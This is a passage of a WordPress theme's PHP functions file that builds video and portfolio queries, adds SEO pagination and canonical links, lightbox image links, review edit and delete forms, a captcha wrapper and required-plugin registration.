					if ( $GLOBALS['ghostpool_orderby']  != 'user_rating' ) { $GLOBALS['ghostpool_meta_query'] = ''; }
					if ( redux_post_meta( 'gp', get_the_ID(), 'videos_post_association' ) == 'enabled' ) {
						$GLOBALS['ghostpool_meta_query'] = array( 'relation' => 'OR', array( 'key' => 'post_association', 'value' => sprintf( ' "%s" ', $post_id ), 'compare' => 'LIKE' ), array( 'key' => '_hub_page_id', 'value' => $post_id, 'compare' => '=' ) );	
					}
				
					$args = array(
						'post_status' => 'publish',
						'post_type'       => 'post',
						'tax_query' => array(
							'relation' => 'AND',
							$GLOBALS['ghostpool_video_cats'],
							array(
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-video' ),
							),			
						),
						'orderby'        => $GLOBALS['ghostpool_orderby_value'],
						'order'          => $GLOBALS['ghostpool_order'],	
						'meta_query' 	 => $GLOBALS['ghostpool_meta_query'],
						'meta_key' 		 => $GLOBALS['ghostpool_meta_key'],	
						'posts_per_page' => $GLOBALS['ghostpool_per_page'],
						'paged'          => $GLOBALS['ghostpool_paged'],
						'date_query' => array( $GLOBALS['ghostpool_date_posted_value'], $GLOBALS['ghostpool_date_modified_value'] ),	
					);
					
				} else {

					$args = array(
						'post_status' => 'publish',
						'post_type'      => 'gp_portfolio_item',
						'tax_query'      => array( 'relation' => 'OR', $GLOBALS['ghostpool_portfolio_cats'] ),
						'posts_per_page' => $GLOBALS['ghostpool_per_page'],
						'orderby'        => $GLOBALS['ghostpool_orderby_value'],
						'order'          => $GLOBALS['ghostpool_order'],
						'paged'          => $GLOBALS['ghostpool_paged'],
						'date_query' => array( $GLOBALS['ghostpool_date_posted_value'], $GLOBALS['ghostpool_date_modified_value'] ),	
					);
					
				}	

				// Contains query data
				$query = new wp_query( $args );
			
				// Get maximum pages from query
				$max_page = $query->max_num_pages;
			
				if ( ! $paged ) {
					$paged = 1;
				}
		
				// Prev rel link
				$prevpage = intval( $paged ) - 1;
				if ( $prevpage < 1 ) {
					$prevpage = 1;
				}	
				if ( $paged > 1 ) {
					echo '<link rel="prev" href="' . get_pagenum_link( $prevpage ) . '">';
				}
		
				// Next rel link
				$nextpage = intval( $paged ) + 1;	
				if ( ! $max_page OR $max_page >= $nextpage ) {
					echo '<link rel="next" href="' . get_pagenum_link( $nextpage ) . '">';
				}

				// Meta noindex,follow on paginated page templates
				if ( ( is_page_template( 'blog-template.php' ) OR is_page_template( 'news-template.php' ) OR is_page_template( 'videos-template.php' ) OR is_page_template( 'portfolio-template.php' ) ) && $paged > 1 ) {
					echo '<meta name="robots" content="noindex,follow">';
				}
					
			}
		}
	}
	add_action( 'wp_head', 'ghostpool_rel_prev_next' );
}

/**
 * Custom canonical rel link
 *
 */
if ( function_exists( 'wpseo_auto_load' ) ) {	
	if ( ! function_exists( 'ghostpool_canonical_link' ) ) {	
		function ghostpool_canonical_link( $canonical ) {
			if ( is_page_template( 'blog-template.php' ) OR is_page_template( 'news-template.php' ) OR is_page_template( 'videos-template.php' ) OR is_page_template( 'portfolio-template.php' ) ) {
				global $paged;		
				if ( ! $paged ) {
					$paged = 1;
				}
				return get_pagenum_link( $paged );
			} else {
				return $canonical;
			}
		}
	}
	add_filter( 'wpseo_canonical', 'ghostpool_canonical_link' );
}									

/**
 * Remove hentry tag from post loop
 *
 */
if ( ! function_exists( 'ghostpool_remove_hentry' ) ) {
	function ghostpool_remove_hentry( $classes ) {
		$classes = array_diff( $classes, array( 'hentry' ) );
		return $classes;
	}
}
add_filter( 'post_class', 'ghostpool_remove_hentry' );

/**
 * Add lightbox class to image links
 *
 */
if ( ! function_exists( 'ghostpool_lightbox_image_link' ) ) {
	function ghostpool_lightbox_image_link( $content ) {	
		global $post;
		if ( ghostpool_option( 'lightbox' ) != 'disabled' ) {
			if ( ghostpool_option( 'lightbox' ) == 'group_images' ) {
				$group = '[image-' . ( empty( $post->ID ) ? rand() : $post->ID ) . ']';
			} else {
				$group = '';
			}
			$pattern = "/<a(.*?)href=('|\")(.*?).(jpg|jpeg|png|gif|bmp|ico)('|\")(.*?)>/i";
			preg_match_all( $pattern, $content, $matches, PREG_SET_ORDER );
			foreach ( $matches as $val ) {
				$pattern = '<a' . $val[1] . 'href=' . $val[2] . $val[3] . '.' . $val[4] . $val[5] . $val[6] . '>';
				$replacement = '<a' . $val[1] . 'href=' . $val[2] . $val[3] . '.' . $val[4] . $val[5] . ' data-rel="prettyPhoto' . $group . '"' . $val[6] . '>';
				$content = str_replace( $pattern, $replacement, $content );			
			}
			return $content;
		} else {
			return $content;
		}
	}	
}
add_filter( 'the_content', 'ghostpool_lightbox_image_link' );	
add_filter( 'wp_get_attachment_link', 'ghostpool_lightbox_image_link' );
add_filter( 'bbp_get_reply_content', 'ghostpool_lightbox_image_link' );

/**
 * Upload post submission image
 *
 */
if ( ! function_exists( 'ghostpool_insert_attachment' ) ) {	
	function ghostpool_insert_attachment( $file_handler, $post_id ) {
		if ( $_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK ) {
			return false;		
		} else {	
			require_once( ABSPATH . 'wp-admin' . '/includes/image.php' );
			require_once( ABSPATH . 'wp-admin' . '/includes/file.php' );
			require_once( ABSPATH . 'wp-admin' . '/includes/media.php' );	
			$overrides = array( 'test_form' => false );
			$attach_id = media_handle_upload( $file_handler, $post_id, array(), $overrides );
			if ( ! is_wp_error( $attach_id ) ) {
				if ( ! add_post_meta( $post_id, '_thumbnail_id', $attach_id, true ) ) {
					update_post_meta( $post_id, '_thumbnail_id', $attach_id );
				}
			}
		}	
	}
}

/**
 * Editing user review meta
 *
 */
if ( ! function_exists( 'ghostpool_my_review_links' ) ) {
	function ghostpool_my_review_links() {
		if ( is_page_template( 'my-reviews-template.php' ) ) { ?>
				<div class="gp-loop-meta">
					<?php esc_html_e( 'User Rating:', 'gauge' ); ?> <?php echo get_post_meta( get_the_ID(), '_user_review_rating', true ); ?> | <?php echo get_the_title( get_post_meta( get_the_ID(), '_hub_page_id', true ) ); ?>
					<?php if ( ghostpool_option( 'write_a_review_editing' ) != 'disabled' ) {
						$edit_a_review_page = get_pages(
							array(
								'meta_key' => '_wp_page_template',
								'meta_value' => 'edit-a-review-template.php'
							)
						);
						if ( $edit_a_review_page ) {
							$edit_a_review_page_id = $edit_a_review_page[0]->ID;
						} else {
							$edit_a_review_page_id = '';
						}
					?>
						<div class="gp-my-reviews-meta">
							<form action="<?php echo get_permalink( $edit_a_review_page_id ); ?>" method="post" class="gp-edit-review-form">
								<input type="hidden" name="ghostpool_user_review_id" value="<?php the_ID(); ?>" />
								<button type="submit"><?php esc_html_e( 'Edit', 'gauge' ); ?></button>
							</form> |
							<form action="" method="post" class="gp-delete-review-form" onSubmit="if ( confirm( '<?php esc_html_e( 'Are you sure you want to delete this review?', 'gauge' ); ?>' ) ) return true; else return false;">
								<input type="hidden" name="ghostpool_user_review_id" value="<?php the_ID(); ?>" />
								<button type="submit"><?php esc_html_e( 'Delete', 'gauge' ); ?></button>
							</form>
						</div>
					<?php } ?>	
				</div>	
			<?php 
		}
	}
}

/**
 * Get captcha data
 *
 */
if ( ! function_exists( 'ghostpool_captcha' ) ) {
	function ghostpool_captcha() {	
		if ( function_exists( 'ghostpool_custom_captcha' ) ) {
			$captcha = ghostpool_custom_captcha();
		} elseif ( has_filter( 'hctpc_verify' ) ) {
			$captcha = apply_filters( 'hctpc_verify', true );
			if ( true === $captcha ) { 
				$captcha = array();
				$captcha['reason'] = ''; 
			} else { 
				$captcha = array();
				$captcha['reason'] = esc_html__( 'Incorrect captcha.', 'gauge' ); 
			}
		} elseif ( has_filter( 'cptch_verify' ) ) {
			$captcha = apply_filters( 'cptch_verify', true );
			if ( true === $captcha ) { 
				$captcha = array();
				$captcha['reason'] = ''; 
			} else { 
				$captcha = array();
				$captcha['reason'] = esc_html__( 'Incorrect captcha.', 'gauge' );
			}			
		} else {
			$captcha = '';
		}
		return $captcha;
	}	
}

/**
 * TGM Plugin Activation class
 *
 */
if ( version_compare( phpversion(), '5.2.4', '>=' ) ) {
	require_once( get_template_directory() . '/lib/inc/class-tgm-plugin-activation.php' );
}

if ( ! function_exists( 'ghostpool_register_required_plugins' ) ) {
	
	function ghostpool_register_required_plugins() {

		$plugins = array(

			array(
				'name'               => esc_html__( 'Gauge Plugin', 'gauge' ),
				'slug'               => 'gauge-plugin',
				'source'             => get_template_directory() . '/lib/plugins/gauge-plugin.zip',
				'required'           => true,
				'version'            => '3.14',
				'force_activation'   => false,
				'force_deactivation' => false,
			),

			array(
				'name'               => esc_html__( 'WPBakery Page Builder', 'gauge' ),
				'slug'               => 'js_composer',
				'source'             => get_template_directory() . '/lib/plugins/js_composer.zip',
				'required'           => true,
				'version'            => '6.0.3',
				'force_activation'	 => false,
				'force_deactivation' => false,
			),

			array(
				'name'               => esc_html__( 'Visual Sidebars Editor', 'gauge' ),
				'slug'               => 'visual-sidebars-editor',
				'source'             => get_template_directory() . '/lib/plugins/visual-sidebars-editor.zip',
				'required'           => false,
				'version'            => '1.2.5',
				'force_activation'	 => false,
				'force_deactivation' => false,
			),
			
			array(
				'name'   		     => esc_html__( 'BuddyPress', 'gauge' ),
				'slug'   		     => 'buddypress',
				'required'   		 => false,
			),
			
			array(
				'name'   		     => esc_html__( 'bbPress', 'gauge' ),
				'slug'   		     => 'bbpress',
				'required'   		 => false,
			),
						
			array(
				'name'   		     => esc_html__( 'WooCommerce', 'gauge' ),
				'slug'   		     => 'woocommerce',
				'required'   		 => false,
			),
			
			array(
				'name'      => esc_html__( 'Post Views Counter', 'gauge' ),
				'slug'      => 'post-views-counter',
				'required' 	=> false,
			),

			array(
				'name'      => esc_html__( 'Social Login', 'gauge' ),
				'slug'      => 'oa-social-login',
				'required' 	=> false,
			),
			
			array(
				'name'   		     => esc_html__( 'Google Captcha', 'gauge' ),
				'slug'   		     => 'google-captcha',
				'required'   		 => false,
			),

			array(
				'name'      => esc_html__( 'Yoast SEO', 'gauge' ),
				'slug'      => 'wordpress-seo',
				'required' 	=> false,
				'is_callable' => 'wpseo_init',
			),
						
			array(
				'name'      		=> esc_html__( 'Envato Market', 'gauge' ),
				'slug'      		=> 'envato-market',
				'source'			=> 'https://envato.github.io/wp-envato-market/dist/envato-market.zip',
				'required' 			=> false,
			),
																				
		);

		$config = array(
			'id'           => 'gauge',
			'default_path' => '',
			'menu'         => 'tgmpa-install-plugins',
			'has_notices'  => true,                 
			'dismissable'  => true,                  
			'dismiss_msg'  => '',
			'is_automatic' => true,
			'message'      => '',
		);
 
		tgmpa( $plugins, $config );

	}
	
}

add_action( 'tgmpa_register', 'ghostpool_register_required_plugins' );

?>